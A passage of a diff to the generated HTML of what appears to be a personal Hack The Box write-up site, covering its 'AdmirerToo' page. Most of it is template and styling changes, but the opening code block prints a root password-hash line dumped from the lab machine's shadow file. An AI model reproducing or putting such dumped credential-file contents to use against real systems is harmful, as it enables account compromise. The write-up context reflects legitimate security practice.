+<pre translate="no" class="language-none"><code v-pre class="language-none">root:$6$eP5MVyB1lXtVQgzU$H4xJdGiHfSu9JmUR80juqHC5BAca79yir2Z6bipW8s.DowTuNRo82/CjN7EMBK8lczD1AMYxgKTIp79DjN2R31:18817:0:99999:7:::</code></pre>
 </doc-codeblock></div>
 
                                 
                                 <!-- Required only on API pages -->
                                 <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                             </div>
-                            <footer class="clear-both">
+                            <footer id="retype-content-footer" class="clear-both">
                             
-                                <nav class="flex mt-14">
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/acute/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/acute/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
-                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
                                                 <span class="block mt-1">Acute</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/catch/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/catch/">
                                             <span>
-                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
                                                 <span class="block mt-1">Catch</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
@@ -843,24 +843,24 @@ lrwxrwxrwx  1 root root    9 Jul  8  2021 .mysql_history -&gt; /dev/null
                             </footer>
                         </main>
                 
-                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
-                            <footer class="flex flex-wrap items-center justify-between">
-                                <div>
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                                <div id="retype-footer-links" class="print:hidden">
                                     <ul class="flex flex-wrap items-center text-sm">
                                     </ul>
                                 </div>
-                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. Caue All rights reserved.</p></div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. Caue All rights reserved.</p></div>
                             </footer>
                         </div>
                     </div>
                 
                     <!-- Rendered if sidebar right is enabled -->
                     <!-- Sidebar right skeleton-->
-                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
                         <div class="pl-5">
-                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                         </div>
                     </div>
                 
@@ -876,7 +876,7 @@ lrwxrwxrwx  1 root root    9 Jul  8  2021 .mysql_history -&gt; /dev/null
     </div>
 
 
-    <div id="docs-overlay-target"></div>
+    <div id="retype-overlay-target"></div>
 
     <script data-cfasync="false">window.__DOCS__ = { "title": "AdmirerToo", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
